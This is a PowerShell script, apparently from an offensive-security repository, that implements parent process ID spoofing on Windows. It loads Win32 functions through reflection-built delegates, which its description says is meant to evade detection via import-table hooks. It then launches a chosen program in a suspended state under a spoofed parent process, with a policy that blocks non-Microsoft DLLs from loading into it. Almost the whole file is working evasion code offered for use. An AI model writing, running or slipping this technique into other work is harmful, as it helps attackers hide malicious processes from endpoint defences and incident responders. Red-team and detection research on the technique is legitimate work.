function PPID-Spoof {
#.SYNOPSIS
# Standalone PowerShell Script for PPID Spoofing (via delegates)
# Arbitrary Version Number: v0.9.9
# Author: Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# This tool does not utilize Add-Type or any embedded C# -- rather it utilizes custom delegates to
# wrap Win32 function pointers.  This prevents detection via Import Address Table (IAT) hooks.
# This tool works with both Windows PowerShell and PowerShell Core (Pwsh).
#
# Windows API Call(s) Utilized:
#  |__ OpenProcess()                    
#  |__ InitializeProcThreadAttributeList 
#  |__ UpdateProcThreadAttribute()
#  |__ CreateProcessA()      
#
# Struct(s) Utilized:
#  |__ STARTUPINFOA
#  |__ PROCESS_INFORMATION
#  |__ SECURITY_ATTRIBUTES
#  |__ STARTUPINFOEXA
#
# Parameters:
#   -CreateProcess  -->  Process to create with spoofed PPID.
#   -ProcessArgs    -->  Pass fake arguments to the created process.
#   -ParentProcess  -->  Name of parent process to attempt to spoof.
#   -ParentPID      -->  PID of parent process to attempt to spoof.
#   -Help           -->  Return Get-Help information.
#
# Example Usage:
# TBD
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS

  <#
    To do:
    - Standardize constants (rename procattrflags or process creation or something)
    - Change MICROSOFT policy implementation to use WriteInt64 instead of WriteIntPtr
    - Do more testing regarding spoofing parent console
  #>

    Param(
        [string]$CreateProcess,
        [string]$ProcessArgs,
        [string]$ParentProcess,
        [UInt32]$ParentPID,
        [switch]$Help
    )


    # Return Get-Help information
    if ($Help) { return (Get-Help PPID-Spoof) }


    # Error Correction
    if (!$CreateProcess)                  { return (Write-Host '[!] Error! Missing target process to execute.' -ForegroundColor Red) }
    if (!$ParentProcess -and !$ParentPID) { return (Write-Host '[!] Error! Missing parent process to spoof.' -ForegroundColor Red) }
    if (!(Get-Item -LiteralPath $CreateProcess 2>$NULL).FullName -and !(Get-Command -Name $CreateProcess 2>$NULL).Path) {
        return (Write-Host "[!] Error! Unable to locate process '${CreateProcess}'." -ForegroundColor Red)
    }


    # Internal Function(s)
    function Load-Win32Function ([string]$Library, [string]$FunctionName, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void]) {

        # Function Description   : PowerShell Script (mini version) to Load Win32 Functions into Session via Function Delegates
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Load-Win32Function.ps1

        Try {
            if ($PSVersionTable.PSEdition -eq 'Core') {
                $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
            else {
                $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
                $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
            }
        }
        Catch { return Generic-Error }
         
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($FunctionName, $False)
            if ($CustomType -ne $NULL) {
                $FunctionDelegate = $CustomType
                break
            }
        }

        if (!$FunctionDelegate) {
            Try {
                $DynAssembly        = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
                $AssemblyBuilder    = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder      = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
                $TypeBuilder        = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder      = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')
                $FunctionDelegate   = $TypeBuilder.CreateType()
            }
            Catch { return Generic-Error }
        }

        Write-Host ' o  Function ' -NoNewline ; Write-Host "'${Library}!${FunctionName}()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
        return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
    }
    function Build-Win32Struct ([string]$StructName, [array]$MembersObject) {

        # Function Description   : PowerShell Script (mini version) to Create Win32 Data Structures in Memory
        # Full Version Reference : https://github.com/tylerdotrar/ShellcodeLoaderPS/blob/main/helpers/Build-Win32Struct.ps1

        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($StructName, $False)
            if ($CustomType -ne $NULL) { return $CustomType }
        }

        Try {
            $DynAssembly     = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
            $AssemblyBuilder = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder   = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
            $Attributes      = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
            $TypeBuilder     = $ModuleBuilder.DefineType($StructName, $Attributes, [System.ValueType])
            foreach ($Member in $MembersObject) { [void]$TypeBuilder.DefineField($Member.Name, $Member.Type, 'Public') }
            return $TypeBuilder.CreateType()
        }
        Catch { return Generic-Error }
    }
    function Generic-Error() {
        Write-Host "[!] Unexpected error occured! Return details:" -ForegroundColor Red
        $Error[0]
        $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
        $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
        return
    }
    function Win32-Error() {
        return (Write-Host " o  --> Failure! Last Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red)
    }
    function Print-Hex ($Integer) {
        return ('0x{0:x}' -f $Integer)
    }
    

    ### Define Required Constant(s) ###

    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    $MemoryAllocation = @{
        MEM_COMMIT  = 0x00001000;
        MEM_RESERVE = 0x00002000;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
    $MemoryProtection = @{
        PAGE_EXECUTE           = 0x10;
        PAGE_EXECUTE_READ      = 0x20;
        PAGE_READWRITE         = 0x04;
        PAGE_EXECUTE_READWRITE = 0x40;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
    $ProcessCreation = @{
        CREATE_SUSPENDED             = 0x00000004; # used
        CREATE_SECURE_PROCESS        = 0x00400000;
        CREATE_NO_WINDOW             = 0x08000000;
        CREATE_NEW_CONSOLE           = 0x00000010;
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
    $ProcessAccess = @{
        PROCESS_ALL_ACCESS        = 0x000F0000 -bor 0x00100000 -bor 0xFFFF;
        PROCESS_CREATE_PROCESS    = 0x0080;
        PROCESS_CREATE_THREAD     = 0x0002;
        PROCESS_QUERY_INFORMATION = 0x0400;
        PROCESS_VM_OPERATION      = 0x0008;
        PROCESS_VM_READ           = 0x0010;
        PROCESS_VM_WRITE          = 0x0020;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights
    $ThreadAccess = @{
        THREAD_SET_CONTEXT       = 0x0010;
        THREAD_SET_INFORMATION   = 0x0020;
        THREAD_QUERY_INFORMATION = 0x0040;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    $StartupFlags = @{
        STARTF_USESTDHANDLES = 0x00000100;
        STARTF_USESHOWWINDOW = 0x00000001;
    }
    # Ref: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute
    $ProcAttrFlags = @{
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS    = 0x00020000;
        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
        PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000; # used
    }


    ### Define Required Struct(s) ###

    # STARTUPINFOA | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'cb'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpReserved'      ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpDesktop'       ; Type = [String] },
        [PSCustomObject]@{ Name = 'lpTitle'         ; Type = [String] },
        [PSCustomObject]@{ Name = 'dwX'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwY'             ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYSize'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwXCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwYCountChars'   ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFillAttribute' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwFlags'         ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'wShowWindow'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'cbReserved2'     ; Type = [Int16]  },
        [PSCustomObject]@{ Name = 'lpReserved2'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdInput'       ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdOutput'      ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hStdError'       ; Type = [IntPtr] }
    )
    $StartupInfoType    = Build-Win32Struct -StructName "STARTUPINFOA" -MembersObject $StructMembers
    $StartupInfoTypeRef = $StartupInfoType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfo        = [STARTUPINFOA]::new()            # Used for Win32 function parameter(s)

    # STARTUPINFOEXA | https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexa
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'StartupInfo'     ; Type = $StartupInfoType },
        [PSCustomObject]@{ Name = 'lpAttributeList' ; Type = [IntPtr] }
    )
    $StartupInfoExType    = Build-Win32Struct -StructName "STARTUPINFOEXA" -MembersObject $StructMembers
    $StartupInfoExTypeRef = $StartupInfoExType.MakeByRefType() # Used for creating function delegate(s)
    $StartupInfoEx        = [STARTUPINFOEXA]::new()            # Used for Win32 function parameter(s)
    
    # PROCESS_INFORMATION | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'hProcess'    ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'hThread'     ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'dwProcessId' ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'dwThreadId'  ; Type = [Int32]  }
    )
    $ProcessInformationType    = Build-Win32Struct -StructName "PROCESS_INFORMATION" -MembersObject $StructMembers
    $ProcessInformationTypeRef = $ProcessInformationType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessInformation        = [PROCESS_INFORMATION]::new()            # Used for Win32 function parameter(s)

    # SECURITY_ATTRIBUTES | https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ns-wtypesbase-security_attributes
    $StructMembers = @(
        [PSCustomObject]@{ Name = 'nLength'              ; Type = [Int32]  },
        [PSCustomObject]@{ Name = 'lpSecurityDescriptor' ; Type = [IntPtr] },
        [PSCustomObject]@{ Name = 'bInheritHandle'       ; Type = [Bool]   }
    )
    $SecurityAttributesType    = Build-Win32Struct -StructName "SECURITY_ATTRIBUTES" -MembersObject $StructMembers
    $SecurityAttributesTypeRef = $SecurityAttributesType.MakeByRefType() # Used for creating function delegate(s)
    $ProcessAttributes         = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 1
    $ThreadAttributes          = [SECURITY_ATTRIBUTES]::new()            # Used for Win32 function parameter(s) 2


    ### Load Required Win32 API Call(s) ### 
    
    Write-Host '[!] Loading Win32 API Calls...' -ForegroundColor Yellow

    # PPID Spoofing
    #  |__ OpenProcess()
    #  |__ InitializeProcThreadAttributeList()
    #  |__ UpdateProcThreadAttribute()
    #  |__ CreateProcessA()

    Try {
        $OpenProcArgs = @(
            [UInt32], # dwDesiredAccess
            [Bool],   # bInheritHandle
            [UInt32]  # dwProcessId
        )
        $OpenProcess = Load-Win32Function -Library "Kernel32.dll" -FunctionName "OpenProcess" -ParamTypes $OpenProcArgs -ReturnType ([IntPtr])

        $InitProcThreadArgs = @(
            [IntPtr],                # lpAttributeList
            [Int32],                 # dwAttributeCount
            [Int32],                 # dwFlags
            [IntPtr].MakeByRefType() # lpSize  
        )
        $InitializeProcThreadAttributeList = Load-Win32Function -Library "Kernel32.dll" -FunctionName "InitializeProcThreadAttributeList" -ParamTypes $InitProcThreadArgs -ReturnType ([Bool])

        $UpdateProcThreadArgs = @(
            [IntPtr], # lpAttributeList
            [UInt32], # dwFlags
            [UInt32], # Attribute
            [IntPtr], # lpValue
            [UInt32], # cbSize
            [IntPtr], # lpPreviousValue
            [IntPtr]  # lpReturnSize
        )
        $UpdateProcThreadAttribute = Load-Win32Function -Library "Kernel32.dll" -FunctionName "UpdateProcThreadAttribute" -ParamTypes $UpdateProcThreadArgs -ReturnType ([Bool])

        $CreateProcArgs = @(
            [String],                   # lpApplicationName
            [String],                   # lpCommandLine
            $SecurityAttributesTypeRef, # lpProcessAttributes
            $SecurityAttributesTypeRef, # lpThreadAttributes
            [Bool],                     # bInheritHandles
            [Int32],                    # dwCreationFlags
            [IntPtr],                   # lpEnvironment
            [String],                   # lpCurrentDirectory
            #$StartupInfoTypeRef,        # lpStartupInfo
            $StartupInfoExTypeRef,      # lpStartupInfo
            $ProcessInformationTypeRef  # lpProcessInformation
        )
        $CreateProcessA = Load-Win32Function -Library "Kernel32.dll" -FunctionName "CreateProcessA" -ParamTypes $CreateProcArgs -ReturnType ([Bool])

        # Sanity Check
        $Win32Funcs = @('OpenProcess','InitializeProcThreadAttributeList','UpdateProcThreadAttribute','CreateProcessA')
        $Win32Funcs | % { if ((Get-Variable -Name $_ -ValueOnly 2>$NULL) -isnot [Delegate]) { 
                return (Write-Host '[!] Error! Failed to load Win32 API calls.' -ForegroundColor Red)
            }
        }
    }
    Catch { return Generic-Error }


    ### Initialize Key Variables ###

    # Parameter Processing
    if (Test-Path -LiteralPath $CreateProcess 2>$NULL) { $CreateProcess = (Get-Item -LiteralPath $CreateProcess).FullName }
    else                                               { $CreateProcess = (Get-Command -Name $CreateProcess).Path         }

    # Determine target parent process
    $CurrentProc = Get-Process -Id $PID
    if ($ParentProcess -and !$ParentPID) {

        Try   { $TargetParent = Get-Process -Name $ParentProcess -ErrorAction Stop | ? { ($_.SI -eq $CurrentProc.SI) -and ($_.PriorityClass -eq $CurrentProc.PriorityClass) } }
        Catch { return (Write-Host '[!] Error! Cannot find the target parent process.' -ForegroundColor Red) }

        if ($TargetParent.Length -gt 1) {
            $i = Get-Random -Minimum 0 -Maximum ($TargetParent.Length - 1)
            $ParentPID = ($TargetParent[$i]).Id
        }
        else { $ParentPID = $TargetParent.Id }
    }

    # Make Sure SI and Priority Class match current process
    $ParentProc  = Get-Process -Id $ParentPID
    if ($ParentProc.SI -ne $CurrentProc.SI)                       { return (Write-Host '[!] Error! Target parent process has a different session ID.' -ForegroundColor Red)  }
    if ($ParentProc.PriorityClass -ne $CurrentProc.PriorityClass) { Write-Host '[!] Warning! Target parent process has a different priority class.' -ForegroundColor Magenta }



    ### (1) Acquire Handle to Parent Process ###

    Write-Host '[!] Acquiring handle to target parent process...' -ForegroundColor Yellow
    Write-Host ' o  ' -NoNewline ; Write-Host 'OpenProcess()' -ForegroundColor Green

    # OpenProcess()
    #  > Description : Acquire a handle to process.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

    # Argument(s)
    $dwDesiredAccess = $ProcessAccess.PROCESS_CREATE_PROCESS  # Desired handle access rights.
    $bInheritHandle  = $FALSE                                 # Boolean for child processes to inherit the handle.
    $dwProcessId     = $ParentProc.Id                         # Target process to be opened.
    
    Try   { $ParentHandle = $OpenProcess.Invoke($dwDesiredAccess, $bInheritHandle, $dwProcessId) }
    Catch { return Generic-Error }

    if ($ParentHandle -eq 0) { return Win32-Error }
    Write-Host " o  --> Target Process : $($ParentProc.ProcessName)"
    Write-Host " o  --> Target PID     : $($ParentProc.Id)"
    Write-host " o  --> Process Handle : $(Print-Hex $ParentHandle)"


    ### (2) Initialize Process Creation Attributes List

    Write-Host '[!] Initializing process creation attribute list...' -ForegroundColor Yellow
    Write-Host ' o  ' -NoNewline ; Write-Host 'InitializeProcThreadAttributeList()' -ForegroundColor Green -NoNewline ; Write-Host ' (1/2)'

    # InitializeProcThreadAttributeList()
    #  > Description : Initializes the specified list of attributes for process and thread creation.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist

    # Argument(s) (1/2)
    $lpAttributeList  = [IntPtr]::Zero  # Process & thread creation attribute list.
    $dwAttributeCount = 2               # Count of attributes to be added to the list.
    $dwFlags          = 0               # Reserved parameter, must be 0.
    $lpSize           = [IntPtr]::Zero  # Output the required size of the lpAttributeList buffer.
    
    Try   { $Initialized = $InitializeProcThreadAttributeList.Invoke($lpAttributeList, $dwAttributeCount, $dwFlags, [ref]$lpSize) }
    Catch { return Generic-Error }

    if ($Initialized) { return Win32-Error }
    Write-Host " o  --> Attribute list size : $(Print-Hex $lpSize)"


    # Argument(s) (2/2)
    $StartupInfoEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
    $StartupInfoEx.StartupInfo.cb  = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfoEx)

    Write-Host ' o  ' -NoNewline ; Write-Host 'InitializeProcThreadAttributeList()' -ForegroundColor Green -NoNewline ; Write-Host ' (2/2)'
    Try   { $Initialized = $InitializeProcThreadAttributeList.Invoke($StartupInfoEx.lpAttributeList, $dwAttributeCount, $dwFlags, [ref]$lpSize) }
    Catch { return Generic-Error }

    if (!$Initialized) { return Win32-Error }
    Write-Host " o  --> Attribute list pointer : $(Print-Hex $StartupInfoEx.lpAttributeList)"


    ### (3) Update Process Creation Attribute List ###

    Write-Host '[!] Updating process creation attribute list...' -ForegroundColor Yellow
    Write-Host ' o  ' -NoNewline ; Write-Host 'UpdateProcThreadAttribute()' -ForegroundColor Green -NoNewline ; Write-Host ' (1/2)'
    
    # UpdateProcThreadAttribute()
    #  > Description : Updates the specified attribute in a list of attributes for process and thread creation.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute

    # Argument(s) (1/2)
    $lpAttributeList = $StartupInfoEx.lpAttributeList                                          # Process & thread creation attribute list.
    $dwFlags         = 0                                                                       # Reserved parameter, must be 0.
    $Attribute       = $ProcAttrFlags.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 
    $lpValue         = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)                                                
    $cbSize          = [IntPtr]::Size                   
    $lpPreviousValue = [IntPtr]::Zero                   
    $lpReturnSize    = [IntPtr]::Zero                                

    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValue, $ParentHandle)

    Try   { $Updated = $UpdateProcThreadAttribute.Invoke($lpAttributeList, $dwFlags, $Attribute, $lpValue, $cbSize, $lpPreviousValue, $lpReturnSize) }
    Catch { return Generic-Error }

    if (!$Updated) { return Win32-Error }
    Write-Host " o  --> Updated attribute list with new parent process."


    # Argument(s) (2/2)
    $Attribute = $ProcAttrFlags.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
    $lpValue   = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
    [System.Runtime.InteropServices.Marshal]::WriteInt64($lpValue, $ProcAttrFlags.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)

    Write-Host ' o  ' -NoNewline ; Write-Host 'UpdateProcThreadAttribute()' -ForegroundColor Green -NoNewline ; Write-Host ' (2/2)'
    Try   { $Updated = $UpdateProcThreadAttribute.Invoke($lpAttributeList, $dwFlags, $Attribute, $lpValue, $cbSize, $lpPreviousValue, $lpReturnSize) }
    Catch { return Generic-Error }

    if (!$Updated) { return Win32-Error }
    Write-Host " o  --> Updated attribute list to prevent non-Microsoft signed DLL's from injecting into the process."
    

    ### (4) Create Target Process in a Suspended State ###
    Start-Sleep -Seconds 3

    Write-Host "[!] Creating target process..." -ForegroundColor Yellow
    Write-Host ' o  ' -NoNewline ; Write-Host 'CreateProcessA()' -ForegroundColor Green

    # CreateProcessA()
    #  > Description : Create a new process and its primary thread.
    #  > Location    : Kernel32.dll
    #  > Reference   : https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

    # Argument(s)
    $lpApplicationName    = $CreateProcess                                                                        # Full path of the application to be executed.
    $lpCommandLine        = "${CreateProcess} ${ProcessArgs}"                                                     # Command line arguments to be executed  (full path + optional arguments).
    $lpProcessAttributes  = [ref]$ProcessAttributes                                                               # Pointer to a SECURITY_ATTRIBUTES struct (for the process).
    $lpThreadAttributes   = [ref]$ThreadAttributes                                                                # Pointer to a SECURITY_ATTRIBUTES struct (for the thread).
    $bInheritHandles      = $TRUE                                                                                 # Boolean for new process to inherit handles from calling process.  
    $dwCreationFlags      = $ProcessCreation.EXTENDED_STARTUPINFO_PRESENT -bor $ProcessCreation.CREATE_NEW_CONSOLE -bor $ProcessCreation.CREATE_SUSPENDED     # New process creation flags.
    $lpEnvironment        = [IntPtr]::Zero                                                                        # Pointer to the environment block for the new process.
    $lpCurrentDirectory   = $(Split-Path -LiteralPath $CreateProcess)                                             # Full path to the current directory for the process.
    $lpStartupInfo        = [ref]$StartupInfoEx                                                                   # Pointer to STARTUPINFOA struct.
    $lpProcessInformation = [ref]$ProcessInformation                                                              # Pointer to PROCESS_INFORMATION struct.

    $ProcessAttributes.bInheritHandle = $TRUE
    $ThreadAttributes.bInheritHandle  = $TRUE
    Start-Sleep -Seconds 1


    Try { $Success = $CreateProcessA.Invoke($lpApplicationName, $lpCommandLine, $lpProcessAttributes, $lpThreadAttributes, $bInheritHandles, $dwCreationFlags, $lpEnvironment, $lpCurrentDirectory, $lpStartupInfo, $lpProcessInformation) }
    Catch { return Generic-Error }

    if (!$Success) { return Win32-Error }
    $RetProcessInformation = $lpProcessInformation.Value
    Write-Host " o  --> Process Path : ${CreateProcess}"
    Write-Host " o  --> Process PID  : $($RetProcessInformation.dwProcessId)"


    # Debug
    #(Get-CimInstance -Class Win32_Process -Filter "ProcessId = '$($RetProcessInformation.dwProcessId)'") | select Name,ProcessId,ParentProcessId
}
